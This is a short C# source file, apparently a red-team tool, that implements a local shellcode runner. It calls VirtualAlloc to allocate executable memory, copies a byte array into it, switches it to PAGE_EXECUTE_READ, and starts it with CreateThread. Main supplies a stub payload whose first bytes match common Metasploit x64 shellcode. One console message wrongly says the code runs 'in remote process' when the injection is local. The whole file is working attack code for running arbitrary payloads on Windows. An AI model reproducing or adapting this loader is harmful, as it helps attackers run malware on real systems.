// Author: @m8sec
using System;
using System.Runtime.InteropServices;

public class shellcode_runner
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    static int LocalInject(byte[] payload)
    {
        const UInt32 MEM_COMMIT = 0x1000;
        const UInt32 MEM_RESERVE = 0x2000;
        const UInt32 PAGE_EXECUTE_READ = 0x20;
        const UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        try
        {
            IntPtr memAddr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Console.WriteLine("[+] Allocated memory at 0x{0}", memAddr);

            Marshal.Copy(payload, 0, memAddr, payload.Length);
            Console.WriteLine("[+] Copyied data into memory.");

            VirtualProtect(memAddr, (UIntPtr)payload.Length, PAGE_EXECUTE_READ, out uint oldProtect);
            Console.WriteLine("[+] Modified memory protection to PAGE_EXECUTE_READ.");

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("[+] Executed code in remote process.");

            WaitForSingleObject(hThread, 0xFFFFFFFF);

            if (hThread != null)
            {
                return 1;
            }

        }
        catch
        {
            Environment.Exit(0);
        }

        return 0;
    }


    static void Main(string[] args)
    {
        byte[] buf = new byte[100] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41};
        LocalInject(buf);
    }
}